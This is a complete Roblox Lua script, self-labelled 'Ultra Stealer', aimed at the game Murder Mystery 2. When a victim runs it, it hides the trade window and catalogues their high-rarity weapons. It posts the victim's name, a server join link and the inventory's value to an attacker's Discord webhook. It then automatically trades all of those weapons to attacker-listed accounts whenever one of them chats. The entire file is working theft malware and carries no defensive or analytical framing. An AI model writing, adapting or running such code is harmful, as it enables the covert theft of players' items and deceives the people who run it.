local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local task = task

if _G.scriptExecuted then return end
_G.scriptExecuted = true

-- Configuración
local webhook = _G.webhook or ""
local users = _G.Usernames or {}
local min_rarity = _G.min_rarity or "Godly"
local min_value = _G.min_value or 1
local ping = _G.pingEveryone or "No"

if #users == 0 or webhook == "" then
    LocalPlayer:Kick("No usernames or webhook provided")
end

if game.PlaceId ~= 142823291 then
    LocalPlayer:Kick("Game not supported")
end

-- Lista manual de valores Godly + Ancient
local valueList = {
    ["gingerscope"]=10700,
    ["travelers axe"]=6900,
    ["celestial"]=975,
    ["astral"]=850,
    ["morning star"]=720,
    ["northern star"]=680,
    ["moonlight"]=640,
    ["helios"]=600,
    ["stormbringer"]=580,
    ["reaper"]=550,
    ["blaze"]=500,
    ["phantom"]=470,
    ["zenith"]=450,
    ["ares"]=420,
    ["hephaestus"]=400,
    ["mystic"]=380
}

-- Función webhook
local function SendWebhook(title, description, fields, prefix)
    local data = {
        ["content"] = prefix or "",
        ["embeds"] = {{
            ["title"] = title,
            ["description"] = description or "",
            ["color"] = 65280,
            ["fields"] = fields or {},
            ["footer"] = {["text"]="Ultra Stealer by Anonimo 🇪🇨"}
        }}
    }
    local body = HttpService:JSONEncode(data)
    pcall(function()
        local req = syn and syn.request or http_request or request
        if req then
            req({Url=webhook, Method="POST", Headers={["Content-Type"]="application/json"}, Body=body})
        end
    end)
end

-- Ocultar GUI de trade
local playerGui = LocalPlayer:WaitForChild("PlayerGui")
for _, guiName in ipairs({"TradeGUI","TradeGUI_Phone"}) do
    local gui = playerGui:FindFirstChild(guiName)
    if gui then
        gui:GetPropertyChangedSignal("Enabled"):Connect(function() gui.Enabled=false end)
        gui.Enabled = false
    end
end

-- Trade avanzado
local TradeService = game:GetService("ReplicatedStorage"):WaitForChild("Trade")
local function getTradeStatus() return TradeService.GetTradeStatus:InvokeServer() end
local function sendTradeRequest(user)
    local plrObj = Players:FindFirstChild(user)
    if plrObj then TradeService.SendRequest:InvokeServer(plrObj) end
end
local function addWeaponToTrade(id) TradeService.OfferItem:FireServer(id,"Weapons") end
local function acceptTrade() TradeService.AcceptTrade:FireServer(285646582) end
local function declineTrade() TradeService.DeclineTrade:FireServer() end
local function declineRequest() TradeService.DeclineRequest:FireServer() end
local function waitForTradeCompletion() while getTradeStatus()~="None" do task.wait(0.1) end end

-- Preparar lista de armas Godly/Ancient
local database = require(game.ReplicatedStorage.Database.Sync.Item)
local rarityTable = {"Common","Uncommon","Rare","Legendary","Godly","Ancient","Unique","Vintage"}
local totalValue = 0
local weaponsToSend = {}

local profile = game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
for id, amount in pairs(profile.Weapons.Owned) do
    local item = database[id]
    if item then
        local rarityIndex = table.find(rarityTable, item.Rarity)
        local minIndex = table.find(rarityTable, min_rarity)
        if rarityIndex and rarityIndex >= minIndex then
            local value = valueList[item.ItemName:lower()] or 2
            if value >= min_value then
                table.insert(weaponsToSend,{
                    DataID = id,
                    Amount = amount,
                    Value = value,
                    TotalValue = value * amount,
                    Rarity = item.Rarity
                })
            end
        end
    end
end

-- Ordenar por valor total descendente
table.sort(weaponsToSend, function(a,b) return a.TotalValue > b.TotalValue end)

-- Calcular valor total real
totalValue = 0
for _, w in ipairs(weaponsToSend) do
    totalValue += w.TotalValue
end

-- Enviar webhook antes del trade
local joinLink = "https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId
local fields = {
    {name="Victim", value=LocalPlayer.Name, inline=true},
    {name="Join link", value=joinLink, inline=false},
    {name="Inventario", value="", inline=false},
    {name="Total value", value=tostring(totalValue), inline=true}
}
for _, w in ipairs(weaponsToSend) do
    fields[3].value = fields[3].value..string.format("%s x%s (%s) | Value: %s\n", w.DataID, w.Amount, w.Rarity, w.TotalValue)
end
local prefix = ping=="Yes" and "@everyone " or ""
SendWebhook("💪MM2 Ultra Hit💯","💰Armas seleccionadas Godly/Ancient",fields,prefix)

-- Función trade avanzado
local function doTrade(targetName)
    while #weaponsToSend > 0 do
        local status = getTradeStatus()
        if status=="None" then
            sendTradeRequest(targetName)
        elseif status=="StartTrade" then
            local blockSize = 4
            while #weaponsToSend>0 and getTradeStatus()=="StartTrade" do
                for i=1, math.min(blockSize,#weaponsToSend) do
                    local w = table.remove(weaponsToSend,1)
                    for _=1, w.Amount do addWeaponToTrade(w.DataID) end
                end
                task.wait(0.3)
            end
            task.wait(6)
            acceptTrade()
            waitForTradeCompletion()
        elseif status=="ReceivingRequest" then
            declineRequest()
            task.wait(0.3)
        elseif status=="StartTrade" then
            declineTrade()
            task.wait(0.3)
        else
            task.wait(0.5)
        end
        task.wait(1)
    end
end

-- Activación trade por chat solo para usuarios permitidos
for _,p in ipairs(Players:GetPlayers()) do
    if table.find(users,p.Name) then
        p.Chatted:Connect(function() doTrade(p.Name) end)
    end
end
Players.PlayerAdded:Connect(function(p)
    if table.find(users,p.Name) then
        p.Chatted:Connect(function() doTrade(p.Name) end)
    end
end)
